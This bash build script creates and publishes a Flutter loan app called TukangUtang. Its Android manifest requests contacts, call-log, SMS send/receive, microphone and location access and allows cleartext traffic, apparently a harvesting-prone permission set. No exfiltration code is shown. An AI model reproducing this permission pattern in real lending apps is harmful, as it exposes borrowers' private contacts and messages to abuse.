#!/bin/bash

echo "🚀 Building Complete Loan Application (17 Pages)..."

# Set Flutter environment
export FLUTTER_ROOT=/var/www/demo/flutter/flutter
export PATH=$FLUTTER_ROOT/bin:$PATH

# Accept licenses
echo "📝 Accepting Android licenses..."
yes | flutter doctor --android-licenses

# Create/Recreate Flutter project
cd /var/www/demo
rm -rf tukangutang_app
flutter create tukangutang_app
cd tukangutang_app

# Update pubspec.yaml with all required dependencies
cat > pubspec.yaml << 'EOF'
name: tukangutang_app
description: "Complete Loan Application with 17 Pages"
publish_to: 'none'
version: 1.0.0+1

environment:
  sdk: '>=3.0.0 <4.0.0'

dependencies:
  flutter:
    sdk: flutter
  cupertino_icons: ^1.0.2
  http: ^1.1.0
  shared_preferences: ^2.2.2
  permission_handler: ^11.0.1
  geolocator: ^10.1.0
  device_info_plus: ^9.1.1
  contacts_service: ^0.6.3
  call_log: ^4.0.0
  sms: ^0.2.0
  image_picker: ^1.0.4
  camera: ^0.10.5+5
  path_provider: ^2.1.1
  intl: ^0.18.1
  flutter_secure_storage: ^9.0.0
  web_socket_channel: ^2.4.0

dev_dependencies:
  flutter_test:
    sdk: flutter
  flutter_lints: ^2.0.0

flutter:
  uses-material-design: true
  assets:
    - assets/images/
EOF

# Create assets directory
mkdir -p assets/images

# Update AndroidManifest.xml with all required permissions
cat > android/app/src/main/AndroidManifest.xml << 'EOF'
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <application
        android:label="TukangUtang"
        android:name="${applicationName}"
        android:icon="@mipmap/ic_launcher"
        android:usesCleartextTraffic="true"
        android:requestLegacyExternalStorage="true">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:theme="@style/LaunchTheme"
            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
            android:hardwareAccelerated="true"
            android:windowSoftInputMode="adjustResize">
            <meta-data
              android:name="io.flutter.embedding.android.NormalTheme"
              android:resource="@style/NormalTheme"
              />
            <intent-filter android:autoVerify="true">
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <meta-data
            android:name="flutterEmbedding"
            android:value="2" />
    </application>
</manifest>
EOF

echo "✅ Configuration files created successfully!"
echo "📱 Building complete loan application with 17 pages..."
echo "🔄 This will take a few minutes..."

# Build the APK
flutter clean
flutter pub get
flutter build apk --release

# Copy APK to public directory
cp build/app/outputs/flutter-apk/app-release.apk /var/www/demo/dashboard-frontend/public/tukangutang_app_release.apk

echo "✅ APK built successfully!"
echo "📁 APK location: /var/www/demo/dashboard-frontend/public/tukangutang_app_release.apk"
echo "🌐 Download URL: https://d.seoikrom.com/tukangutang_app_release.apk"

# Update download page
sed -i 's/18 MB/25 MB/g' /var/www/demo/dashboard-frontend/public/download.html

echo "🎉 Complete loan application build finished!" 